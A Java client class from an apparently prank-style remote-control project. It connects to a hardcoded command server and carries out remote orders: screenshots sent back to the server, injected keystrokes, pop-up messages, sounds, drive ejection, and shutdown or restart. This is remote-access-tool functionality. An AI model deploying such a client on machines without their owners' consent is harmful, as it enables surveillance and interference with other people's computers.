package com.github.connorf.remotecommander;

import static com.github.connorf.remotecommander.CommandConstants.*;

import java.awt.*;
import java.io.*;
import java.net.Socket;

/**
 * the program that runs on each clients machine. The com.github.connorf.remotecommander.Client class
 * connects to the com.github.connorf.remotecommander.Server and waits for instructions
 */
public class Client
{
    private static final int SERVER_PORT = 0xbeef;
    private static final String SERVER_IP_ADDRESS = "127.0.0.1";
    private Socket socket;
    private CommandSet commandSet;
    private DataInputStream inFromServer;

    public Client() throws IOException, UnknownOperatingSystemException, AWTException
    {
        commandSet = setCommandSet();
        connectAndListen();
    }

    /**
     * gets the appropriate command set for the OS that the client is running
     * @return the com.github.connorf.remotecommander.CommandSet that will work on the clients operating system
     * @throws UnknownOperatingSystemException if the operating system is unrecognised
     */
    private CommandSet setCommandSet() throws UnknownOperatingSystemException
    {
        String operatingSystem = System.getProperty("os.name");
        if(operatingSystem.equals("Linux"))
            return new LinuxCommandSet();
        if(operatingSystem.startsWith("Windows"))
            return new WindowsCommandSet();
        if(operatingSystem.startsWith("Mac"))
            return new MacCommandSet();

        throw new UnknownOperatingSystemException("Client OS not Linux, Mac or Windows");
    }

    /**
     * connects to the command server and waits for commands
     * @throws IOException if something went wrong connecting to the command server
     */
    private void connectAndListen() throws IOException, AWTException
    {
        socket = new Socket(SERVER_IP_ADDRESS, SERVER_PORT);
        //BufferedReader inFromServer = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        inFromServer = new DataInputStream(socket.getInputStream());

        while(socket.isConnected())
        {
            String serverCommand = getCommandFromServer();
            System.out.println("Command read from server: " + serverCommand);
            if(serverCommand.equals(TYPE) || serverCommand.equals(SOUND)) // 1 arg commands
                processServerCommand(serverCommand, getCommandFromServer());
            else if(serverCommand.equals(CHAOS)) // 2 arg commands
                processServerCommand(serverCommand, getCommandFromServer(), getCommandFromServer());
            else if(serverCommand.equals(MSG)) // 4 arg commands
                processServerCommand(serverCommand, getCommandFromServer(), getCommandFromServer(), getCommandFromServer());
            else
                processServerCommand(serverCommand);
        }
    }

    /**
     * gets the command string sent from the server
     * @return the command the server sent, null if something went wrong reading the stream
     */
    private String getCommandFromServer()
    {
        String serverCommand = null;
        try
        {
            int commandLength = inFromServer.readInt();
            byte[] commandBytes = new byte[commandLength];
            inFromServer.readFully(commandBytes, 0, commandLength);
            serverCommand = new String(commandBytes);
        }
        catch(IOException ioe)
        {
            System.err.println("Something went wrong reading the command from the server");
            ioe.printStackTrace();
        }

        return serverCommand;
    }

    /**
     * gets a file sent from the server
     * @param size the size of the file the server sent us
     * @return the file the server sent
     * @throws IOException error reading file stream
     */
    private File getSoundFileFromServer(int size) throws IOException //todo: make this get any file
    {
        File sound = File.createTempFile("sou", ".wav", new File(commandSet.getTempPath()));
        byte[] buffer = new byte[size];
        DataInputStream in = new DataInputStream(socket.getInputStream());

        FileOutputStream fos = new FileOutputStream(sound);
        System.out.println("Before readFully: File: " + sound.getName() + " with size: " + size);
        in.readFully(buffer, 0, size);
        fos.write(buffer, 0, size);
        fos.flush();
        System.out.println("After readFully: Size: " + sound.length());
        fos.close();

//        int count;
//        int bytesRead = 0;
//        System.out.println("About to read " + size + " bytes sound file");
//        while (bytesRead != size && (count = in.read(buffer)) > 0)
//        {
//            bytesRead += count;
//            System.out.println("client bytes read count: " + bytesRead);
//            fos.write(buffer, 0, count);
//            //fos.flush(); // todo: needed?
//        }
        System.out.println("Done file transfer");
        return sound;
    }

    /**
     * for sending data on the clients machine back to the server. e.g. screenshots
     * @param toSend the file that needs to be sent
     * @throws IOException if something went wrong sending the file
     */
    public void sendFile(File toSend) throws IOException
    {
        byte[] buffer = new byte[(int)toSend.length()];
        InputStream sendMe = new FileInputStream(toSend);
        DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream());

        outToServer.writeInt((int)toSend.length());
        int count;
        int sentBytes = 0;
        while(sentBytes != toSend.length() && (count = sendMe.read(buffer)) > 0)
        {
            sentBytes += count;
            outToServer.write(buffer, 0, count);
        }

        outToServer.flush();
        sendMe.close();
    }

    /**
     * calls the appropriate method on the com.github.connorf.remotecommander.CommandSet depending on what the server wants us to do to
     * the client
     * @param serverCommand the command from the server and optionally extra arguments (msg command for example provides a msg arg)
     */
    private void processServerCommand(String... serverCommand) throws IOException, AWTException
    {
        switch(serverCommand[0].toLowerCase())
        {
            case EJECT:
                commandSet.eject();
                return;
            case SOUND: // special case: sound requires the sound file from the server so we must retrieve it
                try
                {
                    int fileSize = Integer.valueOf(serverCommand[1]);
                    new Thread(new MakeSound(getSoundFileFromServer(fileSize))).start();
                }
                catch(Exception e)
                {
                    System.out.println("play sound excelption");
                    e.printStackTrace();
                }
                return;
            case SCREENSHOT:
                commandSet.takeScreenshot();
                return;
            case MSG:
                commandSet.showMessage(serverCommand[1], serverCommand[2], serverCommand[3]);
                return;
            case SHUTDOWN:
                commandSet.shutdown();
                return;
            case RESTART:
                commandSet.restart();
                return;
            case CHAOS:
                commandSet.chaos(Long.valueOf(serverCommand[1]), Long.valueOf(serverCommand[2]));
                break;
            case TYPE:
                commandSet.type(serverCommand[1]);
                break;
            case RETRIEVE:
                sendAllImages();
                break;
            default:
                System.out.println("Reached default in processSErverCommand with cmd: " + serverCommand);
        }
    }

    private void sendAllImages() //todo: refactor
    {
        File[] allImages = new File(commandSet.getTempPath()).listFiles();

        try
        {
            DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream());
            int numOfImages = 0;
            for(File file : allImages)
            {
                if(file.getName().endsWith(".jpg"))
                    numOfImages++;
            }
            outToServer.writeInt(numOfImages);
        }
        catch(IOException ioe)
        {
            System.err.println("Failed creating connection to server to send files");
        }

        for(File file : allImages)
        {
            if(file.getName().endsWith(".jpg"))
            {
                try
                {
                    sendFile(file);
                }
                catch(IOException ioe)
                {
                    ioe.printStackTrace();
                }
            }
        }
    }
}
